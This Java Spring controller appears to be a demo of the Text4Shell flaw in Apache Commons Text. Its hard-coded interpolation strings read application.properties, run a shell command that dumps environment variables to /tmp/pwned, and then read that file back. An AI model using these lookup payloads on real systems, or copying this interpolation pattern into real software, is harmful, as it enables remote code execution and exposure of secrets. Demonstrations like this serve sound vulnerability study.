package org.dontpanic.text4shell.controller;

import org.apache.commons.text.StringSubstitutor;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.GetMapping;

import java.util.Map;

@Controller
public class HomeController {

    private final Map<String, String> uiStrings = Map.of(
            "USERNAME", "Username: ${username}",
            "TIME", "Current time: ${date:yyyy-MM-dd hh:mm:ss}",
            "FILE_CONTENTS", "File: ${file:UTF-8:src/main/resources/application.properties}",
            "RCE", "You've been pwned! ${script:javascript:java.lang.Runtime.getRuntime().exec(['/bin/sh', '-c', 'env > /tmp/pwned'])}",
            "FILE_CONTENTS_2", "File: ${file:UTF-8:/tmp/pwned}"
    );

    @GetMapping("/")
    public String index(ModelMap model) {
        Map<String, String> values = Map.of("username", "jbloggs");
        StringSubstitutor replacer = new StringSubstitutor(values);
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();

        model.put("username", replacer.replace(uiStrings.get("USERNAME")));
        model.put("time", interpolator.replace(uiStrings.get("TIME")));
        model.put("file_content", interpolator.replace(uiStrings.get("FILE_CONTENTS")));
        model.put("rce", interpolator.replace(uiStrings.get("RCE")));
        model.put("file_content2", interpolator.replace(uiStrings.get("FILE_CONTENTS_2")));
        return "index";
    }

}
